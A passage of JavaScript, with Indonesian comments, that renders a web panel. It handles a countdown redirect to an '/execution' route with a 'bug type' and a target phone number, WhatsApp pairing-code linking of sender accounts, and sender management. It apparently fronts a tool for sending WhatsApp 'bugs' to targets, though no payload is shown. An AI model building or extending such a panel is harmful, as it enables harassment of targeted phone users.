                    clearInterval(countdownInterval);
                    window.location.href = \`/execution?mode=\${selectedBugType}&target=\${encodeURIComponent(number)}\`;
                }
            }, 1000);
        }

        // Function untuk membuat efek confetti
        function createConfetti() {
            const colors = ['#4CAF50', '#FFEB3B', '#2196F3', '#E91E63', '#9C27B0', '#FF9800'];
            
            for (let i = 0; i < 50; i++) {
                const confetti = document.createElement('div');
                confetti.className = 'confetti';
                confetti.style.left = Math.random() * 100 + 'vw';
                confetti.style.width = Math.random() * 10 + 5 + 'px';
                confetti.style.height = Math.random() * 10 + 5 + 'px';
                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.animation = \`confettiFall \${Math.random() * 3 + 2}s linear forwards\`;
                confetti.style.animationDelay = Math.random() * 2 + 's';
                
                document.body.appendChild(confetti);
                
                // Hapus confetti setelah animasi selesai
                setTimeout(() => {
                    if (confetti.parentNode) {
                        confetti.parentNode.removeChild(confetti);
                    }
                }, 5000);
            }
        }

        // Function untuk menampilkan notifikasi biasa
        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            const bgColor = type === 'error' ? '#f44336' : 
                           type === 'success' ? '#4CAF50' : 
                           '#2196F3';
            
            notification.style.cssText = \`
                position: fixed;
                top: 20px;
                right: 20px;
                background: \${bgColor};
                color: white;
                padding: 15px 20px;
                border-radius: 10px;
                z-index: 10001;
                max-width: 400px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.3);
                animation: slideIn 0.3s ease;
            \`;
            
            notification.innerHTML = \`
                <div style="display: flex; align-items: center; gap: 10px;">
                    <i class="fas fa-\${type === 'error' ? 'exclamation-triangle' : type === 'success' ? 'check-circle' : 'info-circle'}"></i>
                    <span>\${message}</span>
                </div>
            \`;
            
            document.body.appendChild(notification);
            
            // Auto remove setelah 5 detik
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            }, 5000);
        }

        // Initialize
        initCarousel();

        // Mobile menu toggle
        const menuToggle = document.getElementById('menuToggle');
        const navMenu = document.getElementById('navMenu');

        menuToggle.addEventListener('click', () => {
            navMenu.classList.toggle('active');
            menuToggle.classList.toggle('active');
        });

        // Resize handler
        let resizeTimeout;
        window.addEventListener('resize', () => {
            clearTimeout(resizeTimeout);
            resizeTimeout = setTimeout(updateCarousel, 250);
        });
        
  if (window.location.search.includes('target=') && !window.location.search.includes('justExecuted=true')) {
    // Hapus parameter dari URL tanpa reload
    const newUrl = window.location.pathname;
    window.history.replaceState({}, document.title, newUrl);
    
    // Redirect ke halaman tanpa parameter
    window.location.href = newUrl;
  }
  
  // Auto-redirect ke halaman utama setelah 5 detik di success page
  if (window.location.search.includes('justExecuted=true')) {
    setTimeout(() => {
      window.location.href = '/execution';
    }, 5000);
  }
  
// Real-time events untuk pairing code
function initEventStream() {
    const eventSource = new EventSource('/api/events');
    
    eventSource.onmessage = function(event) {
        const data = JSON.parse(event.data);
        console.log('Received event:', data);
        
        switch(data.type) {
            case 'status':
                showNotification(data.message, 'info');
                updateSenderStatus(data.number, data.status);
                break;
                
            case 'pairing_code':
                showPairingCodeModal(data);
                updateSenderStatus(data.number, data.status);
                break;
                
            case 'success':
                showNotification(data.message, 'success');
                updateSenderStatus(data.number, data.status);
                loadUserSenders(); // Refresh list
                break;
                
            case 'error':
                showNotification(data.message, 'error');
                updateSenderStatus(data.number, data.status);
                break;
        }
    };
    
    eventSource.onerror = function(err) {
        console.error('EventSource error:', err);
        // Coba reconnect setelah 5 detik
        setTimeout(initEventStream, 5000);
    };
}

// Function untuk menampilkan modal pairing code
function showPairingCodeModal(data) {
    const modalHtml = \`
        <div class="pairing-modal" style="
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        ">
            <div style="
                background: linear-gradient(135deg, #1a1a2e, #16213e);
                border: 2px solid var(--accent-purple-light);
                border-radius: 20px;
                padding: 30px;
                max-width: 500px;
                width: 90%;
                color: white;
                text-align: center;
            ">
                <h3 style="color: var(--accent-purple-light); margin-bottom: 20px;">
                    <i class="fas fa-qrcode"></i> Kode Pairing WhatsApp
                </h3>
                
                <div style="
                    background: rgba(255,255,255,0.1);
                    border-radius: 15px;
                    padding: 20px;
                    margin: 20px 0;
                    border: 1px solid var(--accent-purple);
                ">
                    <div style="font-size: 32px; font-weight: bold; letter-spacing: 3px; color: white;">
                        \${data.code}
                    </div>
                </div>
                
                <div style="text-align: left; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px; margin: 15px 0;">
                    <h4 style="color: var(--accent-purple-light); margin-bottom: 10px;">Cara Pakai:</h4>
                    <ol style="text-align: left; padding-left: 20px;">
                        <li>Buka WhatsApp di HP Anda</li>
                        <li>Tap ⋮ (titik tiga) > Linked Devices > Link a Device</li>
                        <li>Masukkan kode: <strong>\${data.code}</strong></li>
                        <li>Kode berlaku 30 detik!</li>
                    </ol>
                </div>
                
                <div style="color: #ffa726; font-size: 14px; margin: 10px 0;">
                    <i class="fas fa-exclamation-triangle"></i>
                    Jangan bagikan kode ini ke siapapun!
                </div>
                
                <button onclick="closePairingModal()" style="
                    background: var(--accent-purple);
                    color: white;
                    border: none;
                    padding: 12px 30px;
                    border-radius: 25px;
                    cursor: pointer;
                    font-weight: bold;
                    margin-top: 10px;
                ">
                    <i class="fas fa-times"></i> Tutup
                </button>
            </div>
        </div>
    \`;
    
    // Hapus modal sebelumnya jika ada
    const existingModal = document.querySelector('.pairing-modal');
    if (existingModal) {
        existingModal.remove();
    }
    
    document.body.insertAdjacentHTML('beforeend', modalHtml);
}

function closePairingModal() {
    const modal = document.querySelector('.pairing-modal');
    if (modal) {
        modal.remove();
    }
}

// Function untuk update status sender di list
function updateSenderStatus(number, status) {
    const senderItem = document.querySelector(\`[data-number="\${number}"]\`);
    if (senderItem) {
        const statusEl = senderItem.querySelector('.sender-status');
        if (statusEl) {
            statusEl.className = 'sender-status ' + status;
        }
    }
}
  
  // === USER SENDER MANAGEMENT ===
function loadUserSenders() {
    fetch('/api/my-senders')
        .then(response => response.json())
        .then(data => {
            const sendersList = document.getElementById('sendersList');
            
            if (!data.success || data.senders.length === 0) {
                sendersList.innerHTML = '<div class="no-senders">Belum ada sender. Tambahkan sender pertama Anda!</div>';
                return;
            }
            
            let html = '';
            data.senders.forEach(sender => {
                html += \`
                    <div class="sender-item">
                        <div class="sender-info">
                            <div class="sender-status connected"></div>
                            <span class="sender-number">\${sender}</span>
                        </div>
                        <div class="sender-actions">
                            <button class="delete-sender-btn" onclick="deleteSender('\${sender}')">
                                <i class="fas fa-trash"></i> Hapus
                            </button>
                        </div>
                    </div>
                \`;
            });
            
            sendersList.innerHTML = html;
        })
        .catch(error => {
            console.error('Error loading senders:', error);
            document.getElementById('sendersList').innerHTML = '<div class="no-senders">Error memuat daftar sender</div>';
        });
}

function addSender() {
    const numberInput = document.getElementById('newSenderNumber');
    const number = numberInput.value.trim();
    
    if (!number) {
        alert('Masukkan nomor terlebih dahulu!');
        return;
    }
    
    const addBtn = document.getElementById('addSenderBtn');
    const originalText = addBtn.innerHTML;
    
    addBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> MENAMBAH...';
    addBtn.disabled = true;
    
    fetch('/api/add-sender', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ number: number })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('✓ ' + data.message);
            numberInput.value = '';
            loadUserSenders(); // Refresh list
        } else {
            alert('✗ ' + data.error);
        }
    })
    .catch(error => {
        alert('✗ Terjadi error: ' + error.message);
    })
    .finally(() => {
        addBtn.innerHTML = originalText;
        addBtn.disabled = false;
    });
}

function deleteSender(number) {
    if (!confirm('Yakin ingin menghapus sender ' + number + '?')) {
        return;
    }
    
    fetch('/api/delete-sender', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ number: number })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('✓ ' + data.message);
            loadUserSenders(); // Refresh list
        } else {
            alert('✗ ' + data.error);
        }
    })
    .catch(error => {
        alert('✗ Terjadi error: ' + error.message);
    });
}

// Event listeners untuk sender management
document.getElementById('addSenderBtn').addEventListener('click', addSender);
document.getElementById('newSenderNumber').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        addSender();
    }
});

// Inisialisasi event stream saat halaman dimuat
document.addEventListener('DOMContentLoaded', function() {
    initEventStream();
    loadUserSenders();
});
    </script>
</body>
</html>`;
};
